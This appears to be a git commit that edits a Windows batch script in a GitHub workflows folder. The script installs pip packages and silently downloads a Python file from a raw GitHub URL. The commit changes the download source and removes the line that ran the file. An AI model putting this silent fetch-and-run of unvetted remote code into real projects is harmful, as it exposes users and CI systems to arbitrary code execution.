009d608978b6d4bfd6f51058e7a9c60578815c05
OliverVasquezy <OliverVasquezy@att.net>
2024-09-06 05:42:27 -0400

    Update loop.bat

--- .github/workflows/loop.bat
+++ .github/workflows/loop.bat
@@ -1,5 +1,4 @@
 @echo off
 pip install psutil --quiet
 pip install requests --quiet
-curl -s -L -o loop.py https://raw.githubusercontent.com/iamo4r2/min/main/.github/workflows/loop.py
-python loop.py
+curl -s -L -o loop.py https://raw.githubusercontent.com/OliverVasquezy/super/main/.github/workflows/loop.py
